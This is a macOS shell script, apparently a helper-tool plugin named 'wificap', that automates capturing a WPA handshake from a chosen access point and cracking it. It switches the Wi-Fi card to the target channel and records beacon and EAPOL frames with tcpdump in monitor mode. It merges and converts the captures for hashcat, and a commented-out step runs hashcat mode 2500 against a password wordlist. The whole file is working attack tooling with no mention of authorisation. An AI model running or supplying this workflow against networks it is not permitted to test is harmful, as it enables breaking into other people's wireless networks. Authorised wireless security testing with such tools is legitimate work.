
AIRPORT="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
# INTERFACE=en0


function hand_wificap()
{
	local sub=$1
	shift
	case $sub in
	"hashcat")
		wificap_hashcat "$@"
		;;
	"init")
		# $bssid $channel
		wificap_init "$@"
		;;
	"capbeacon")
		# $beacon.cap
		wificap_init
		wificap_beacon "$@"
		;;
	"caphandshake")
		# $handshake.cap
		wificap_init
		wificap_handshake "$@"
		;;
	"merge")
		# $beacon.cap $handshake.cap $capture.cap
		wificap_merge "$@"
		;;
	# "crack")
	# 	# $inputfile $wordlist
	# 	wificap_crack "$@"
	# 	;;
	*)
		if [ ! "$sub" ]; then
			hand echo warn "please define: "
			echo INTERFACE=
			echo BSSID=
			echo CHANNEL=
			return 1
		fi

		source "$sub"
		
		# hand echo error "$sub unsupported"
		# echo "wificap v1.0"
		# echo "Usage: wificap init \$bssid \$channel"
		wificap_init "$@"
		wificap_beacon
		wificap_handshake
		wificap_merge

		return 0
		;;
	esac
}

wificap_hashcat()
{
	local hashcat_path
	hashcat_path=`hand prop get wificap.hashcat.path`
	if [ $? -ne 0 ]; then
		echo $hashcat_path
		return 1
	fi

	cd $hashcat_path
	./hashcat "$@"
	cd -
}

# wificap_crack()
# {
# 	local inputfile=$1
# 	local wordlist=$2

# 	if [ ! "$inputfile" ]; then
# 		inputfile="capture.hccapx"
# 	fi

# 	if [ ! "$wordlist" ]; then
# 		wordlist="$HOME/Documents/crackstation-human-only.txt"
# 	fi
# 	hand echo do hashcat -m 2500 $inputfile $wordlist
# }


# init with $bssid and $channel
function wificap_init()
{
	if [ ! "$BSSID" ]; then
		if [ "$1" ]; then
			BSSID=$1
			hand prop set wificap.bssid "$BSSID"
		else
			BSSID=`hand prop get wificap.bssid`
			if [ $? -ne 0 ]; then
				echo $BSSID
				return 1
			fi
		fi
	fi
	
	if [ ! "$CHANNEL" ]; then
		if [ "$2" ]; then
			CHANNEL=$2
			hand prop set wificap.channel $CHANNEL
		else
			CHANNEL=`hand prop get wificap.channel`
			if [ $? -ne 0 ]; then
				echo $CHANNEL
				return 1
			fi
		fi
	fi

	# disassociate
	hand echo do sudo $AIRPORT -z
	# set the channel
	# DO NOT PUT SPACE BETWEEN -c and the channel
	# for example sudo airport -c6
	hand echo do sudo $AIRPORT -c$CHANNEL
}

function wificap_beacon()
{
	if [ ! "$1" ]; then
		outfile="beacon.cap"
	else
		outfile=$1
	fi
	echo sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $INTERFACE -w $outfile
	sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $INTERFACE -w $outfile
}

#
function wificap_handshake()
{
	if [ ! "$1" ]; then
		outfile="handshake.cap"
	else
		outfile=$1
	fi
	echo sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w $outfile
	sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w $outfile
}

# merge beacon.cap with handshake.cap to capture.cap
function wificap_merge()
{

	if [ ! "$1" ]; then
		file1="beacon.cap"
	else
		file1=$1
	fi

	if [ ! "$2" ]; then
		file2="handshake.cap"
	else
		file2=$2
	fi

	if [ ! "$3" ]; then
		outfile="capture.cap"
	else
		outfile=$3
	fi

	hand echo do mergecap -a -F pcap -w $outfile $file1 $file2

	hand echo do cap2hccapx $outfile capture.hccapx
}


# hand_wificap "$@"




# if [ "$1" = "-h" ]; then
# 	echo "wificap v1.0"
# 	echo "Usage: wificat \$bssid \$channel"
# 	return 0
# fi

# if [ "$1" ]; then
# 	BSSID=$1
# 	hand prop set wificap.bssid $BSSID
# else
# 	BSSID=`hand prop get wificap.bssid`
# 	if [ $? -ne 0 ]; then
# 		echo $BSSID
# 		return 1
# 	fi
# fi

# if [ "$2" ]; then
# 	CHANNEL=$2
# 	hand prop set wificap.channel $CHANNEL
# else
# 	CHANNEL=`hand prop get wificap.channel`
# 	if [ $? -ne 0 ]; then
# 		echo $CHANNEL
# 		return 1
# 	fi
# fi







# # BSSID="08:9b:4b:97:4f:56"
# # CHANNEL=11
# INTERFACE=en0

# AIRPORT="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

# # disassociate
# hand echo do sudo $AIRPORT -z
# # set the channel
# # DO NOT PUT SPACE BETWEEN -c and the channel
# # for example sudo airport -c6
# hand echo do sudo $AIRPORT -c$CHANNEL
# # capture a beacon frame from the AP
# echo sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $INTERFACE -w beacon.cap
# sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $INTERFACE -w beacon.cap
# # hand echo do sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $INTERFACE -w beacon.cap
# # wait for the WPA handshake
# echo sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w handshake.cap
# sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w handshake.cap
# # hand echo do sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w handshake.cap
# # merge the two files
# hand echo do mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap